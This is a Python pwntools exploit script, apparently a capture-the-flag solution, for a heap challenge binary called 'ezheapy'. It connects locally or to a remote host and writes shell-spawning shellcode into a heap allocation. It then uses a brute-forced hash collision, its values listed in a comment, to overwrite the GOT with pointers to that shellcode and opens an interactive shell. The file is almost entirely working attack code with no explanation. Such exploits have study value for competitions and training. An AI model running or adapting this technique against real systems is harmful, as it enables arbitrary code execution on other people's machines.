#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './ezheapy'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc # '../libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag              :p.info(tag + ': {:#x}'.format(eval(tag)))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

# info
def add(sz):
    sla('5. Exit', '1')
    sla('How big is your paste (bytes)?', str(sz))

def edit(idx,data):
    sla('5. Exit', '2')
    sla('What paste would you like to write to?', str(idx))
    sla('Enter your input', data)

add(1024)
edit(0,asm(shellcraft.sh()))

# debug()
''' bf
0x4a153 0x1648c563
0x4a154 0xb4803f14
0x4a155 0x52b7b8c5
0x4a156 0xf0ef3276
0x4a157 0x8f26ac27
0x4a158 0x2d5e25d8
0x4a159 0xcb959f89
0x4a15a 0x69cd193a
0x4a15b 0x80492eb
'''
add(0x4a15b) # hash(0x4a15b) == 0x80492eb == gotbase-0xbed
edit(1,'A'*0xbed+p64(0xdde6c400)*20) # hash(1024) == 0xdde6c400

p.interactive()
